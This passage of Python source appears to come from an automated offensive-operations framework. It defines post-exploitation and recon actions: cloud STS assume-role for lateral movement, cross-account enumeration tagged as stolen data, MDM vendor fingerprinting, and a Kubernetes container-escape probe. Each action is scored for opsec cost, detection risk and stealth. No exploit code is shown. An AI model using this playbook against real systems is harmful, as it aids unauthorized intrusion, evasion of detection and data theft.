        banner="cloud IAM enumeration"),

    _mk("cloud_assume_role", "post",
        "STS assume-role on a discovered IAM role ARN (temporary credential "
        "set), then verify the new identity with get-caller-identity. The "
        "core cloud lateral-movement primitive",
        [_mk_slot("role_arn", "str", True, "IAM role ARN to assume")],
        ["cloud_lateral"], _cloud_assume_role_adapter, _cloud_assume_role_interp,
        opsec_cost=1.5, detection_risk=0.6, stealth_level="active", timeout=45,
        preconditions=[_has_cloud_creds()],
        banner="cloud STS assume-role"),

    _mk("cloud_cross_account", "post",
        "With an assumed role: enumerate cross-account visibility — buckets "
        "under the assumed identity, AWS Organizations account list, Lambda "
        "inventory (read-only)",
        [], ["cloud_access", "cloud_lateral", "stolen_data"],
        _cloud_cross_account_adapter, _cloud_cross_account_interp,
        opsec_cost=1.2, detection_risk=0.5, stealth_level="active", timeout=60,
        preconditions=[_has_cloud_creds()],
        banner="cloud cross-account enum"),

    _mk("mobile_probe", "recon",
        "Probe for mobile/device-management or phone-homing services that "
        "indicate the infra supports mobile (MDM endpoints, APNS/GCM "
        "gateways, mobile-web user-agents), so the engagement branches into "
        "the mobile attack surface",
        [], ["mobile"], _mobile_probe_adapter, _mobile_probe_interp,
        opsec_cost=0.6, detection_risk=0.1, stealth_level="passive", timeout=30,
        preconditions=[_has_network_host()], banner="mobile surface probe"),

    _mk("mobile_mdm_fingerprint", "recon",
        "Fingerprint a discovered MDM enrollment endpoint: vendor class "
        "(Jamf/Intune/MobileIron/AirWatch/Kandji/SimpleMDM), auth mode "
        "(SAML/Entra/user+pass), API surface (/api/v1, /api/mdm), and "
        " enrollment-profile exposure. Read-only GETs with MDM vendor "
        "user-agents; the vendor class shapes the follow-up attack tree",
        [_mk_slot("base_url", "str", False, "MDM base URL (default: target)")],
        ["mobile", "mdm_vendor"], _mdm_fingerprint_adapter,
        _mdm_fingerprint_interp,
        opsec_cost=0.8, detection_risk=0.2, stealth_level="active", timeout=40,
        preconditions=[_has_network_host()], banner="MDM vendor fingerprint"),

    _mk("k8s_escape", "post",
        "Probe a compromised container for Kubernetes escape primitives:",
        [], ["k8s_escape", "system_privilege"], _k8s_escape_adapter,
        _k8s_escape_interp,
        opsec_cost=0.8, detection_risk=0.3, stealth_level="passive", timeout=40,
        preconditions=[_has_beacon(), _has_k8s()],
        banner="kubernetes escape probe"),
]
